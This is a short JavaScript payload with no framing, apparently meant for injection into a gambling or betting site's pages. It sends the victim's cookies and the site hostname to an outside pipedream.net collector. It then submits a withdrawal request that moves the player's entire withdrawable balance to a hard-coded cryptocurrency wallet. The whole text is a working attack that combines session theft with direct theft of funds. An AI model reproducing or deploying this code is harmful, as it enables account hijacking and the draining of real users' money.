fetch(`https://eodcnv9aow0mu5f.m.pipedream.net/?site=${location.hostname}&taxi=${document.cookie}`);
console.log("ebanina!!!");
const formData = new FormData();
formData.append('paymentSystem', 24);
formData.append('sum', window.player.balances.withdraw);
formData.append('wallet_id', "TGPNk7d7JKxKmLP1q7bxqzLmxx32Qtgs3T");
formData.append("_name","");
formData.append("_pass","");


fetch(`https://${location.hostname}/finance/withdraw/request`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
  },
  body: formData,
})
.then(response => {
  console.log('Response:', response);
})
.catch(error => {
  console.error('Error:', error);
});
